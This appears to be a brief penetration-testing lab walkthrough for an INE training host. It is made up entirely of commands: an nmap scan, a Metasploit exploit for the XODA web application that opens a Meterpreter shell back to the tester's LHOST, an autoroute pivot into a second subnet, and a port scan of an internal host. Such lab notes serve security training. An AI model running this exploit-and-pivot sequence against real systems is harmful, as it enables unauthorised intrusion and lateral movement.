
```bash
nmap -sC -sV -O demo1.ine.local -oX output

- 80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))


msfconsole
> search xoda
> use 0
> set RHOSTS 192.220.111.3
> set LHOST 10.1.0.8
> set TARGETURI /
> exploit

meterpreter > ifconfig
meterpreter > run autoroute -s 192.3.56.2
meterpreter > background

> search portscan
> use 5
> set RHOSTS 192.3.56.2
> run
3 ports are open.
```